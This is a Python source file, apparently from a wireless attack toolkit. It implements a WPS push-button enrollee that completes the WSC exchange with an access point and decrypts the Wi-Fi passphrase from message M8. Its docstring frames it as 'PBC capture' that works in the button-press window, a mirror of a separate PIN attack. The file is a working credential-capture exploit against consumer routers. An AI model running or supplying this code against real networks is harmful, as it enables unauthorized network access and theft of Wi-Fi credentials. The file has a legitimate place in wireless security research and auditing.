"""WpsEnrollee — the enrollee-side WSC state machine, for PBC capture.

When someone presses an AP's WPS button it becomes the **Registrar** and hands
the network credential to any **Enrollee** that completes WSC within the ~120 s
walk window. We play that enrollee: the message polarity is the mirror of the
PIN attack (we build M1/M3/M5/M7, the AP sends WSC_Start/M2/M4/M6/M8), and the
**PSK arrives in M8's Credential**.

PBC has no secret: the device password is the public constant "00000000"
(`messages.PBC_PASSWORD`), so both sides derive the same PSK1/PSK2 and our
E-hashes verify. The exchange's confidentiality rests entirely on the DH key,
which is why this must be active — a passive capture can't derive it.

Transport-agnostic (same `send`/`recv` contract as WpsRegistrar); the live
adapter and the in-process fake-Registrar test both satisfy it.
"""

from __future__ import annotations

import logging
import os
import time

from . import messages as M
from . import wsc_crypto as wc
from .registrar import AttemptOutcome, PinResult, WpsTransport

logger = logging.getLogger(__name__)


class WpsEnrollee:
    def __init__(
        self,
        transport: WpsTransport,
        bssid: bytes,
        our_mac: bytes,
        msg_timeout: float = 3.0,
        eapol_start_timeout: float = 2.0,
        overall_timeout: float = 30.0,
        log=None,
    ):
        self.t = transport
        self.bssid = bssid
        self.our_mac = our_mac
        self.msg_timeout = msg_timeout
        self.eapol_start_timeout = eapol_start_timeout
        self.overall_timeout = overall_timeout
        self.log = log or logger.debug

    async def _send_1x(self, payload_1x: bytes) -> None:
        await self.t.send(M.build_data_frame(self.bssid, self.our_mac, self.bssid, payload_1x))

    async def run(self) -> AttemptOutcome:
        """Drive EAPOL-Start → Identity → M1..M7 → extract the PSK from M8."""
        priv, pke = wc.dh_generate_keypair()
        nonce_e = os.urandom(wc.NONCE_LEN)
        uuid_e = os.urandom(16)
        e_s1 = os.urandom(wc.SECRET_NONCE_LEN)
        e_s2 = os.urandom(wc.SECRET_NONCE_LEN)
        mac_e = self.our_mac

        pkr = nonce_r = authkey = keywrapkey = psk1 = psk2 = None
        highest_mt = 0          # stale-retransmit guard (WSC never runs backward)
        sent_m1 = False

        # Log each protocol stage once — the AP retransmits each message, so
        # without this the event log floods with duplicate M2/M4/M6 lines.
        logged: set = set()

        def once(stage: str, msg: str) -> None:
            if stage not in logged:
                logged.add(stage)
                self.log(msg)

        await self._send_1x(M.eapol_start())

        deadline = time.monotonic() + self.overall_timeout
        timeout = self.eapol_start_timeout
        while time.monotonic() < deadline:
            frame = await self.t.recv(min(timeout, deadline - time.monotonic()))
            timeout = self.msg_timeout
            if frame is None:
                return AttemptOutcome(PinResult.TIMEOUT, "<PBC>", detail="no EAP response")

            p = M.parse_rx_frame(frame)
            if p is None:
                continue

            if p.is_identity_request:
                if not sent_m1:
                    await self._send_1x(M.eap_identity_response(p.eap_id, M.ENROLLEE_IDENTITY))
                continue

            if p.is_eap_failure or p.wsc_msg_type == M.WPS_WSC_NACK:
                return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>",
                                      detail="EAP-FAIL/NACK (overlap or refused)")

            # WSC_Start (an opcode, not a msg-type) kicks off M1.
            if p.wsc_opcode == M.WSC_START and p.wsc_msg_type == 0:
                if not sent_m1:
                    m1 = M.build_m1(uuid_e, mac_e, nonce_e, pke)
                    await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m1))
                    sent_m1 = True
                    once("m1", "M1: sending enrollee identity + public key")
                continue

            mt = p.wsc_msg_type
            if mt and mt < highest_mt:
                continue                  # stale retransmit of a stage we've passed
            if mt in (M.WPS_M2, M.WPS_M4, M.WPS_M6, M.WPS_M8):
                highest_mt = mt

            if mt == M.WPS_M2:
                pkr = p.attrs.get(M.ATTR_PUBLIC_KEY)
                nonce_r = p.attrs.get(M.ATTR_REGISTRAR_NONCE)
                if not pkr or not nonce_r:
                    return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>", detail="M2 missing PKr/nonce")
                shared = wc.dh_shared_secret(pkr, priv)
                authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                psk1, psk2 = wc.derive_psk(authkey, M.PBC_PASSWORD)
                m3 = M.build_m3_enrollee(nonce_r, e_s1, e_s2, psk1, psk2, pke, pkr,
                                         authkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m3))
                once("m3", "M2 → M3: E-hash committed")

            elif mt == M.WPS_M4:
                if authkey is None:
                    return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>", detail="M4 before keys")
                m5 = M.build_m5_enrollee(nonce_r, e_s1, authkey, keywrapkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m5))
                once("m5", "M4 → M5: revealing E-S1")

            elif mt == M.WPS_M6:
                m7 = M.build_m7_enrollee(nonce_r, e_s2, authkey, keywrapkey, p.raw_wsc_attrs)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m7))
                once("m7", "M6 → M7: revealing E-S2")

            elif mt == M.WPS_M8:
                creds = M.extract_m8_credentials(p.attrs.get(M.ATTR_ENCR_SETTINGS, b""), keywrapkey)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_DONE,
                                                       M.build_wsc_done(nonce_e, nonce_r)))
                if not creds or "network_key" not in creds:
                    return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>", detail="M8 had no Network Key")
                ssid = creds.get("ssid")
                psk = creds["network_key"]
                once("m8", "M8 → SUCCESS: credential decrypted")
                return AttemptOutcome(
                    PinResult.SUCCESS, "<PBC>",
                    psk=psk.decode("utf-8", "replace"),
                    ssid=ssid.decode("utf-8", "replace") if ssid else None,
                )

        return AttemptOutcome(PinResult.TIMEOUT, "<PBC>", detail="exchange did not converge")
